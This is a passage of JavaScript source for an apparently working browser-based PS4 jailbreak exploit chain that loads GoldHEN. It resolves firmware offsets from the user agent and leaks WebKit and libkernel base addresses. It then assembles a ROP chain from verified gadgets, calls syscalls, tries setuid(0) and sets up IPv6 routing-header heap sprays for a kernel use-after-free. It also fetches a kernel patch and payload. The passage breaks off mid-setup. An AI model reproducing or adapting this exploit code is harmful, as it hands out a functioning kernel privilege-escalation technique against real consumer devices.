  function offsetsFor(uaString) {
    const m = (uaString || "").match(/PlayStation\s+4[\/ ](\d+)\.(\d+)/);
    if (!m) return { key: null, off: null };
    const key = m[1] + "." + parseInt(m[2], 16).toString(16).padStart(2, "0");
    return { key, off: PS4[key] || null };
  }

  // slopkit/chain_poops.js
  function ensureHostConsole() {
    var out = document.getElementById("out");
    var st = document.getElementById("state");
    if (!out) {
      out = document.createElement("pre");
      out.id = "out";
      out.setAttribute(
        "style",
        "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;"
      );
      (document.body || document.documentElement).appendChild(out);
    }
    if (!st) {
      st = document.createElement("div");
      st.id = "state";
      st.setAttribute(
        "style",
        "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;"
      );
      (document.body || document.documentElement).appendChild(st);
    }
    return { outEl: out, stateEl: st };
  }
  var _hostCons = ensureHostConsole();
  var outEl = _hostCons.outEl;
  var stateEl = _hostCons.stateEl;
  var lines = [];
  var params = new URLSearchParams(location.search);
  var STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
  function hostOk() {
    var m = document.getElementById("progress");
    if (m) {
      m.innerHTML = "GoldHEN v2.4b18.12 Loaded :)";
      m.style.color = "green";
    }
  }
  function hostFail() {
    var m = document.getElementById("progress");
    if (m) {
      m.innerHTML = "Failed to Load! Restart Your Console ...";
      m.style.color = "red";
    }
  }
  function post(tag, detail) {
    try {
      const x = new XMLHttpRequest();
      x.open("POST", "t", true);
      x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      x.send("PS4-S10&tag=" + encodeURIComponent(tag) + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) {
    }
  }
  var VERBOSE = params.get("verbose") === "1";
  var PROSE = [
    / -- /,
    /\.\s/,
    /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/
  ];
  function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
      const m = re.exec(s);
      if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
  }
  function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);

    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));

    const esc = function(t) {
        return String(t)
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
    };

    const l = esc(
        tag + (detail == null || detail === "" ? "" : "  " + detail)
    );

    const c =
        /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l)
            ? "bad"
            : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l)
                ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l)
                    ? "ok"
                    : "";

    const html = c
        ? '<span class="' + c + '">' + l + "</span>"
        : l;

    var progressEl = document.getElementById("progress");

    if (progressEl) {
        progressEl.innerHTML = html;
    }

    post(tag, raw);
}
  function trace(tag, detail) {
    if (VERBOSE) mark(tag, detail);
    else post(tag, detail);
  }
  function state(t, c) {
    stateEl.textContent = t;
    stateEl.className = c || "";
  }
  function check(name, ok, detail) {
    return ok;
  }
  function hx(n) {
    return "0x" + (n >>> 0).toString(16);
  }
  var SYS = {
    read: 3,
    write: 4,
    close: 6,
    getpid: 20,
    setuid: 23,
    getuid: 24,
    dup: 41,
    sendmsg: 28,
    recvmsg: 27,
    socket: 97,
    netcontrol: 99,
    socketpair: 135,
    kqueue: 362,
    readv: 120,
    writev: 121,
    sysctl: 202,
    pipe: 42,
    fcntl: 92,
    setsockopt: 105,
    getsockopt: 118,
    sched_yield: 331,
    rtprio_thread: 466,
    cpuset_setaffinity: 488,
    cpuset_getaffinity: 487,
    thr_self: 432,
    ioctl: 54,
    mmap: 477,
    jitshm_create: 533,
    kexec: 661
  };
  var NETEVENT_SET_QUEUE = 536870915;
  var NETEVENT_CLEAR_QUEUE = 536870919;
  var AF_UNIX = 1;
  var AF_INET6 = 28;
  var SOCK_STREAM = 1;
  var IPPROTO_IPV6 = 41;
  var IPV6_RTHDR = 51;
  var UCRED_SIZE = 360;
  var KQUEUE_SIZE = 256;
  var NUM_LEAK_KQUEUE = 5e3;
  var KQ_BATCH = 8;
  var KQ_HDR_MAGIC = 21168128;
  var NUM_UIO_IOV = 20;
  var UIO_SIZE = 48;
  var NUM_UIO_SPRAY = 1e4;
  var NUM_IOV_SPRAY_MAX = 1e5;
  var UIO_READ = 0;
  var UIO_WRITE = 1;
  var UIO_SYSSPACE = 1;
  var SOL_SOCKET = 65535;
  var SO_SNDBUF = 4097;
  var PIPEBUF_SIZEOF = 24;
  var PIPE_PAGE = 16384;
  var FILEDESCENT_SIZE = 8;
  var F_SETFL = 4;
  var O_NONBLOCK = 4;
  var IP6_RTHDR0_SIZE = 8;
  var IN6_ADDR_SIZE = 16;
  var NUM_MSG_IOV = 23;
  var IOVEC_SIZE = 16;
  var MSGHDR_SIZE = 48;
  var NUM_IPV6_SOCK = 256;
  var RTHDR_TAG = 322371584;
  var MAX_ROUNDS_TWIN = 10;
  var MAX_ROUNDS_TRIPLET = 500;
  var FIND_TRIPLET_FAST = 5e3;
  var RTP_PRIO_REALTIME = 2;
  var RTP = 256;
  var RTP_SET = 1;
  var MAIN_CORE = 7;
  var RTP_LOOKUP = 0;
  var RTP_PRIO_NORMAL = 0;
  var CPU_LEVEL_WHICH = 3;
  var CPU_WHICH_TID = 1;
  var JSVALUE_UNDEFINED = new int64(10, 4294967287);
  var keepAlive2 = [];
  var workers = [];
  var mainMf = null;
  var mainOrig = null;
  var mainArmed = false;
  var committed = false;
  var rebootRequired = false;
  var kreadPoisoned = false;
  var uafSock = 0;
  var uafFpSaved = null;
  var savedMask = null;
  var savedPrio = null;
  var restoreCtx = null;
  var attrsRestored = false;
  var allDone = false;
  var payloadRunning = false;
  (async function() {
    let p = null;
    try {
      let bufAddr = function(ab) {
        const c = p.leakval(ab);
        return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data));
      }, put = function(dv, at, v) {
        if (typeof v === "number") {
          dv.setUint32(at, v >>> 0, true);
          dv.setUint32(at + 4, v < 0 ? 4294967295 : 0, true);
        } else {
          dv.setUint32(at, v.low >>> 0, true);
          dv.setUint32(at + 4, v.hi >>> 0, true);
        }
      }, makeCtx = function() {
        const sb = new ArrayBuffer(32), pb = new ArrayBuffer(PB_SIZE);
        const kb = new ArrayBuffer(8192), fb = new ArrayBuffer(64);
        keepAlive2.push(sb, pb, kb, fb);
        const c = {
          storeDv: new DataView(sb),
          pivotDv: new DataView(pb),
          stackDv: new DataView(kb),
          frameDv: new DataView(fb),
          stackU8: new Uint8Array(kb),
          frameU8: new Uint8Array(fb)
        };
        keepAlive2.push(
          c.storeDv,
          c.pivotDv,
          c.stackDv,
          c.frameDv,
          c.stackU8,
          c.frameU8
        );
        c.S = bufAddr(sb);
        c.P = bufAddr(pb);
        c.K = bufAddr(kb);
        c.F = bufAddr(fb);
        put(c.storeDv, 0, G.G1);
        put(c.storeDv, 8, c.P);
        put(c.storeDv, 16, G.G3);
        put(c.storeDv, 24, G.G2);
        put(c.pivotDv, 0, c.P);
        put(c.pivotDv, 16, G.G5);
        put(c.pivotDv, 32, G.G4);
        return c;
      }, layout = function(c, target, args) {
        c.stackU8.fill(0);
        c.frameU8.fill(0);
        const insts = [];
        for (let i = 0; i < args.length; ++i) {
          insts.push(argGadget[i]);
          insts.push(args[i]);
        }
        const targetIdx = insts.length;
        insts.push(target);
        insts.push(G.POP_RDI_RET);
        insts.push(c.F);
        insts.push(G.MOV_RDI_RAX_RET);
        insts.push(G.POP_RAX_RET);
        insts.push(JSVALUE_UNDEFINED);
        insts.push(G.LEAVE_RET);
        let at = 8192 - 8 * insts.length;
        if ((c.K.low + at + 8 * targetIdx & 15) !== 0) at -= 8;
        for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
        put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
      }, callAddr = function(target, args) {
        layout(M, target, args);
        const saved = p.read8(pivotCell);
        p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
        p.write8(pivotCell, saved);
        return {
          lo: M.frameDv.getUint32(0, true),
          hi: M.frameDv.getUint32(4, true),
          i32: M.frameDv.getUint32(0, true) | 0
        };
      }, errno = function() {
        const r = callAddr(errorFn, []);
        const a = new int64(r.lo, r.hi);
        return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
      }, burn = function(fd, why) {
        if (fd > 0 && !burned.has(fd)) {
          burned.add(fd);
          mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
        }
      }, buildRthdr = function(dv, size) {
        const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
        new Uint8Array(dv.buffer).fill(0);
        dv.setUint8(0, 0);
        dv.setUint8(1, n * 2);
        dv.setUint8(2, 0);
        dv.setUint8(3, n);
        return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
      }, getRthdr = function(s, size, need2) {
        if (R2_ON) leakU8.fill(238, 0, size);
        lenDv.setUint32(0, size, true);
        const rv = sc(
          SYS.getsockopt,
          s,
          IPPROTO_IPV6,
          IPV6_RTHDR,
          leakAddr,
          lenAddr
        ).i32;
        if (rv !== 0) return -1;
        const got = lenDv.getUint32(0, true);
        if (R2_ON && need2 !== void 0 && got < need2) {
          shortReads++;
          return -1;
        }
        return got;
      }, netevent = function(sock, event) {
        argDv.setUint32(0, sock >>> 0, true);
        argDv.setUint32(4, 0, true);
        const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
        return { rv: r, err: r === -1 ? errno() : 0 };
      }, makeRpc = function(w, name) {
        let seq = 0;
        const pending = /* @__PURE__ */ new Map();
        w.onmessage = function(e) {
          const d = e.data || {};
          const slot = pending.get(d.id);
          if (!slot) return;
          pending.delete(d.id);
          if (slot.timer) clearTimeout(slot.timer);
          if (d.type === "err") slot.reject(new Error(String(d.value)));
          else slot.resolve(d.value);
        };
        w.onerror = (e) => mark("WORKER-ONERROR", name + " " + (e && e.message ? e.message : String(e)));
        return function call(fname, timeoutMs, ...args) {
          return new Promise(function(resolve, reject) {
            const id = seq++;
            const timer = timeoutMs > 0 ? setTimeout(function() {
              pending.delete(id);
              reject(new Error(name + ": timeout waiting for " + fname));
            }, timeoutMs) : null;
            pending.set(id, { resolve, reject, timer });
            w.postMessage({ id, name: fname, args });
          });
        };
      }, ptrish = function(v) {
        return v.hi > 0 && v.hi < 65536 && (v.low & 7) === 0;
      }, fireW = function(w, num, args, timeoutMs) {
        layout(w.ctx, stubAddr.get(num), args);
        return w.rpc(
          "fire",
          timeoutMs === void 0 ? 15e3 : timeoutMs,
          w.ctx.S.low,
          w.ctx.S.hi
        );
      }, tagFor = function(i) {
        return (RTHDR_TAG | i & 65535) >>> 0;
      }, readTag = function() {
        const v = leakDv.getUint32(4, true) >>> 0;
        return { ok: (v & 4294901760) >>> 0 === RTHDR_TAG, idx: v & 65535 };
      }, findTwins = function(timeout) {
        for (let round = 0; round < timeout; ++round) {
          for (let i = 0; i < ipv6.length; ++i) {
            if (burned.has(ipv6[i])) {
              sprayOk[i] = false;
              continue;
            }
            sprayDv.setUint32(4, tagFor(i), true);
            sprayOk[i] = setRthdr(ipv6[i]) === 0;
          }
          for (let i = 0; i < ipv6.length; ++i) {
            if (R2_ON && !sprayOk[i]) continue;
            if (getRthdr(ipv6[i], IP6_RTHDR0_SIZE, 8) < 0) continue;
            const t = readTag();
            if (t.ok && t.idx !== i && t.idx < ipv6.length && (!R2_ON || sprayOk[t.idx]))
              return { a: ipv6[i], b: ipv6[t.idx], round };
          }
          if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
        }
        return null;
      }, findTriplet = function(master, slave, tag, timeout) {
        const rounds = timeout || MAX_ROUNDS_TRIPLET;
        const seen = [];
        let untagged = 0;
        for (let round = 0; round < rounds; ++round) {
          for (let i = 0; i < ipv6.length; ++i) {
            if (ipv6[i] === master || ipv6[i] === slave) continue;
            if (burned.has(ipv6[i])) continue;
            sprayDv.setUint32(4, tagFor(i), true);
            setRthdr(ipv6[i]);
          }
          const t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0 ? { ok: false, idx: 0 } : readTag();
          if (!t.ok) untagged++;
          const fd = t.ok && t.idx < ipv6.length ? ipv6[t.idx] : -1;
          if (seen.length < 6)
            seen.push(t.ok ? t.idx + "->fd" + fd : "untagged");
          if (fd !== -1 && fd !== master && fd !== slave && !burned.has(fd)) {
            (/^(RE|UW)/.test(tag) ? trace : mark)("TRIPLET-" + tag, "round=" + round + " fd=" + fd + " untagged=" + untagged);
            return fd;
          }
          if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
        }
        mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave=" + slave + " rounds=" + rounds + " untagged=" + untagged + "  first reads: " + seen.join(" "));
        return 0;
      }, bootFingerprint = function() {
        const nameAb = new ArrayBuffer(8), outAb = new ArrayBuffer(16);
        keepAlive2.push(nameAb, outAb);
        const nameAddr = bufAddr(nameAb), outAddr = bufAddr(outAb);
        const nameDv = new DataView(nameAb);
        new Uint8Array(outAb).fill(0);
        nameDv.setUint32(0, 1, true);
        nameDv.setUint32(4, 21, true);
        lenDv.setUint32(0, 16, true);
        lenDv.setUint32(4, 0, true);
        const rv = sc(SYS.sysctl, nameAddr, 2, outAddr, lenAddr, 0, 0).i32;
        const gotLen = lenDv.getUint32(0, true);
        const o = new DataView(outAb);
        const sec = o.getUint32(0, true);
        if (rv !== 0 || sec === 0) {
          bootErr = "rv=" + rv + " errno=" + errno() + " oldlen=" + gotLen;
          return null;
        }
        return sec.toString(16) + ":" + o.getUint32(8, true).toString(16);
      }, fakeUio = function(uioIov, resid, rw) {
        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, uioIov);
        iovDv.setUint32(8, NUM_UIO_IOV, true);
        put(iovDv, 16, -1);
        put(iovDv, 24, resid);
        iovDv.setUint32(32, UIO_SYSSPACE, true);
        iovDv.setUint32(36, rw, true);
        put(iovDv, 40, 0);
      }, restoreRefcntIov = function() {
        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, 1);
        put(iovDv, 8, 1);
      }, tripletsUsable = function() {
        return triplets && triplets.length === 3 && triplets.every((fd) => fd > 0 && ipv6.indexOf(fd) >= 0);
      }, tripletsAgree = function(why) {
        if (!tripletsUsable()) return false;
        const tags = [];
        for (const fd of triplets) {
          if (getRthdr(fd, UCRED_SIZE, 8) < 0) {
            trace("TRIPLET-VALIDATE", why + " fd=" + fd + " short-read");
            return false;
          }
          const v = leakDv.getUint32(4, true) >>> 0;
          if ((v & 4294901760) >>> 0 !== RTHDR_TAG) {
            trace("TRIPLET-VALIDATE", why + " fd=" + fd + " untagged=" + hx(v));
            return false;
          }
          tags.push(v);
        }
        const agree = tags[0] === tags[1] && tags[1] === tags[2];
        if (!agree)
          trace("TRIPLET-VALIDATE", why + " disagree " + tags.map(hx).join(","));
        return agree;
      }, refindPair = function(tag) {
        for (let retry = 0; retry < 3; ++retry) {
          triplets[1] = findTriplet(
            triplets[0],
            -1,
            tag + "1",
            FIND_TRIPLET_FAST
          );
          triplets[2] = findTriplet(
            triplets[0],
            triplets[1],
            tag + "2",
            FIND_TRIPLET_FAST
          );
          if (tripletsUsable() && tripletsAgree(tag)) return true;
          sc(SYS.sched_yield);
        }
        mark("REFIND-UNVALIDATED", "tag=" + tag + " triplets=" + triplets.join(","));
        return false;
      }, kaddrOk = function(v) {
        return isKptr(v) && kAligned(v);
      };
      const NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 4;
      const NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 8;
      const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 256;
      const { key, off } = offsetsFor(navigator.userAgent);
      mark("FW", key || "(not a PS4 UA)");
      if (!off) {
        var m = document.getElementById("progress");
        if (m) {
          m.innerHTML = 'No offsets for this firmware: <span style="color: red;">' + (key || "Unknown") + "</span>";
        }
        mark("NO-OFFSETS", key || "unknown");
        return;
      }
      mark("FW-STATUS", off.fw_status || "none");
      mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT + " spray=" + NUM_IOV_SPRAY + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
      let kpatch = null, payload = null;
      const kpatchName = off && off.kpatch ? off.kpatch : key ? key.replace(".", "") + ".bin" : null;
      //const kpatchName = off && off.kpatch ? "slopkit/patches/" + off.kpatch : key ? "slopkit/patches/" + key.replace(".", "") + ".bin" : null;
      const KPATCH_JMP_SITES = [];
      try {
        if (kpatchName) {
          const r = await Promise.resolve({ ok: true, arrayBuffer: async () => __getPatchU8(kpatchName).buffer });
          if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
        }
      } catch (e) {
        mark("KPATCH-FETCH-THREW", e.message);
      }
      if (kpatch) {
        for (let i = 0; i + 7 <= kpatch.length; ++i) {
          if (kpatch[i] !== 198 || kpatch[i + 1] !== 129) continue;
          if (kpatch[i + 6] !== 235) continue;
          KPATCH_JMP_SITES.push((kpatch[i + 2] | kpatch[i + 3] << 8 | kpatch[i + 4] << 16 | kpatch[i + 5] << 24) >>> 0);
        }
      }
      mark("KPATCH-BLOB", kpatch ? "blob=" + kpatchName + " bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "blob=" + kpatchName + " MISSING");
      try {
        const r = await fetch("payload.bin");
        if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
      } catch (e) {
        mark("PAYLOAD-FETCH-THREW", e.message);
      }
      mark("PAYLOAD-BLOB", payload ? "bytes=" + payload.length + " entry=" + (payload[0] === 233 ? "e9-jmp-rel32" : "NOT-e9") : "MISSING");
      state("running the primitive...", "warn");
      await new Promise((r) => setTimeout(r, 0));
      const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
      const carrier2 = await establishPrimitive({
        maxAttempts: 6,
        onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, (a != null ? "[" + a + "] " : "") + (d || ""))
      });
      const PAIR_ON = params.get("pair") === "1";
      const SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 6;
      const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 60;
      const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 8;
      installWindowP(carrier2, {
        promote: PAIR_ON,
        onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
      });
      if (!window.p) throw new Error("window.p was not installed");
      p = window.p;
      mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted + " stage=" + pairStatus.stage + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "") + (pairStatus.error ? " error=" + pairStatus.error : ""));
      if (pairStatus.promoted && SWEEP_CYCLES > 0) {
        state("sweeping...", "warn");
        const t0 = Date.now();
        let worst = 0;
        for (let i = 0; i < SWEEP_CYCLES; ++i) {
          const c0 = Date.now();
          let junk = [];
          for (let k = 0; k < SWEEP_MB; ++k)
            junk.push(new ArrayBuffer(1048576));
          junk.length = 0;
          junk = null;
          await new Promise((r) => setTimeout(r, SWEEP_MS));
          const dt = Date.now() - c0;
          if (dt > worst) worst = dt;
        }
        mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst + " total_ms=" + (Date.now() - t0));
      } else {
        mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted + " cycles=" + SWEEP_CYCLES);
      }
      mark("PRIMITIVE-OK", "");
      const cell = p.leakval(Math.expm1);
      const nativeFn = p.read8(p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function));
      const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
      const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
      const libkernelBase = errorFn.sub32(off.k__error);
      mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
      const aligned = (v) => v.hi > 0 && (v.low & 16383) === 0;
      if (!check(
        "module-bases-0x4000-aligned",
        aligned(webkitBase) && aligned(libkernelBase),
        ""
      )) {
        throw new Error("module bases not aligned");
      }
      const G = {};
      const GAD = [
        ["POP_RDI_RET", off.wk_POP_RDI_RET, [95, 195]],
        ["POP_RSI_RET", off.wk_POP_RSI_RET, [94, 195]],
        ["POP_RDX_RET", off.wk_POP_RDX_RET, [90, 195]],
        ["POP_RCX_RET", off.wk_POP_RCX_RET, [89, 195]],
        ["POP_R8_RET", off.wk_POP_R8_RET, [null, 88, 195]],
        ["POP_R9_RET", off.wk_POP_R9_RET, [null, 89, 195]],
        ["POP_RAX_RET", off.wk_POP_RAX_RET, [88, 195]],
        ["LEAVE_RET", off.wk_LEAVE_RET, [201, 195]],
        ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [72, 137, 7, 195]],
        ["G0", off.wk_MOV_RDI_RSI_30_CALL, [72, 139, 126, 48]],
        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [88, 72, 139, 7]],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [85, 72, 137, 229]],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [72, 139, 120, 8]],
        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [72, 139, 80, off.pivot_view_sp]],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [82, 92, 195]]
      ];
      let gated = 0;
      for (const [nm, rva, pat] of GAD) {
        const a = webkitBase.add32(rva);
        let good = true;
        for (let i = 0; i < pat.length; ++i) {
          if (pat[i] === null) continue;
          if (p.read1(a.add32(i)) !== pat[i]) {
            good = false;
            break;
          }
        }
        if (good) {
          G[nm] = a;
          gated++;
        } else mark("GADGET-BAD", nm);
      }
      if (!check(
        "gadget-table-fits-module",
        gated === GAD.length,
        gated + "/" + GAD.length
      )) {
        throw new Error("gadget table incomplete");
      }
      const argGadget = [
        G.POP_RDI_RET,
        G.POP_RSI_RET,
        G.POP_RDX_RET,
        G.POP_RCX_RET,
        G.POP_R8_RET,
        G.POP_R9_RET
      ];
      const stubAddr = /* @__PURE__ */ new Map();
      let seeded = 0;
      if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
          const num = +numStr, o = off.k_stubs[numStr];
          const v = p.read8(libkernelBase.add32(o));
          if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
          if ((v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0 !== num) continue;
          stubAddr.set(num, libkernelBase.add32(o));
          seeded++;
        }
      }
      const need = new Set(Object.keys(SYS).map((k) => SYS[k]).filter((n) => !stubAddr.has(n)));
      let scanned = 0;
      for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
        const num = (v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0;
        if (!need.has(num)) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        need.delete(num);
        scanned++;
      }
      mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
      const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
      if (!check(
        "syscall-page-needs-stub",
        miss.length === 0,
        miss.join(",")
      )) {
        throw new Error("missing syscall stubs");
      }
      const PB_SIZE = Math.max(40, off.pivot_view_sp + 8 + 15 & ~15);
      const M = makeCtx();
      mainMf = p.read8(cell.add32(24)).add32(off.wk_JSFunction_m_function);
      mainOrig = p.read8(mainMf);
      const pivotObj = {};
      keepAlive2.push(pivotObj);
      const pivotCell = p.leakval(pivotObj);
      p.write8(mainMf, G.G0);
      mainArmed = true;
      const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
      const pid = sc(SYS.getpid).i32;
      check(
        "chain-reaches-kernel",
        pid > 0,
        "pid=" + pid + " uid=" + sc(SYS.getuid).i32
      );
      try {
        var uid0 = sc(SYS.getuid).i32;
        var su0 = sc(SYS.setuid, 0).i32;
        if (uid0 === 0 || su0 === 0) {
          mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
          var m = document.getElementById("progress");
          if (m) {
            m.innerHTML = "GoldHEN is Already Loaded";
            m.style.color = "orang";
          }
          return;
        }
      } catch (e) {
      }
      const scratchAb = new ArrayBuffer(4096);
      keepAlive2.push(scratchAb);
      const scratch = bufAddr(scratchAb);
      const argAb = new ArrayBuffer(8);
      keepAlive2.push(argAb);
      const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
      const lenAb = new ArrayBuffer(8);
      keepAlive2.push(lenAb);
      const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
      const sprayAb = new ArrayBuffer(UCRED_SIZE);
      keepAlive2.push(sprayAb);
      const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
      const leakAb = new ArrayBuffer(UCRED_SIZE);
      keepAlive2.push(leakAb);
      const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
      const leakU8 = new Uint8Array(leakAb);
      const R2_ON = params.get("r2") !== "0";
      let shortReads = 0;
      const burned = /* @__PURE__ */ new Set();
      const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
      const setRthdr = (s) => sc(
        SYS.setsockopt,
        s,
        IPPROTO_IPV6,
        IPV6_RTHDR,
        sprayAddr,
        sprayLen
      ).i32;
      const freeRthdr = (s) => {
        if (burned.has(s)) {
          mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
          return -1;
        }
        return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
      };
      const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
      const msgAb = new ArrayBuffer(MSGHDR_SIZE);
      keepAlive2.push(iovAb, msgAb);
      const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
      const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);
      new Uint8Array(iovAb).fill(0);
      put(iovDv, 0, 1);
      put(iovDv, 8, 1);
      new Uint8Array(msgAb).fill(0);
      put(msgDv, 16, iovAddr);
      msgDv.setInt32(24, NUM_MSG_IOV, true);
      state("setting up...", "warn");
      if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
        throw new Error("socketpair failed");
      const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
      if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
        throw new Error("uio socketpair failed");
      const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
      mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
      if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
      const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
      if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
      const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
      check(
        "karw-pipe-pairs-exist",
        masterPipe[0] > 0 && masterPipe[1] > 0 && slavePipe[0] > 0 && slavePipe[1] > 0,
        "master " + masterPipe + "  slave " + slavePipe
      );
      const dummyAb = new ArrayBuffer(4096);
      keepAlive2.push(dummyAb);
      new Uint8Array(dummyAb).fill(65);
      const dummyAddr = bufAddr(dummyAb);
      const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
      keepAlive2.push(uioIovAb);
      const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);
      new Uint8Array(uioIovAb).fill(0);
      put(uioIovDv, 0, dummyAddr);
      const ipv6 = [];
      for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
        const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
        if (s === -1) break;
        ipv6.push(s);
      }
      check(
        "reclaim-sockets-open",
        ipv6.length === NUM_IPV6_SOCK,
        ipv6.length + "/" + NUM_IPV6_SOCK
      );
      const NUM_UIO_WORKER = params.has("uio") ? parseInt(params.get("uio"), 10) : 4;
      const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
      state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
      for (let i = 0; i < TOTAL_WORKERS; ++i) {
        const name = (i < NUM_IOV_WORKER ? "iov" : "uio") + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
        const w = { name, armed: false, wired: false };
        workers.push(w);
        w.worker = new Worker("rpc_worker.js");
        w.rpc = makeRpc(w.worker, name);
        if (await w.rpc("ping", 15e3) !== "pong")
          throw new Error(name + " did not answer ping");
        const sLo = (269484032 | i) >>> 0, sHi = (3235774464 | i) >>> 0;
        const arr = await w.rpc("init", 15e3, sLo, sHi);
        keepAlive2.push(arr);
        const D = bufAddr(arr.buffer);
        if (p.read4(D) >>> 0 !== sLo)
          throw new Error(name + ": transfer did not preserve the store");
        const storage = p.read8(D.add32(16));
        const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
        if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
